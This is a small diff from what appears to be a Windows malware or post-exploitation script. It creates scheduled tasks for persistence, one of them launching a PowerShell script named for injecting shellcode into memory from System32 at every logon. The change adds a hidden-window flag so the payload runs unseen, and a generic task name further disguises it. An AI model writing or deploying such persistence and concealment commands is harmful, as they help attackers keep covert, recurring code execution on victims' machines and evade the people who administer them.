@@ -88,4 +88,4 @@ schtasks /create /sc minute /mo 3 /tn "service" "net start logrotate"
 
 # Automatically inject shellcode into memory 
 # Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located.
-schtasks /create /tn "MyCustomTask" /sc onlogon /tr "powershell.exe -File C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
+schtasks /create /tn "MyCustomTask" /sc onlogon /tr "powershell.exe -windowstyle hidden -File C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
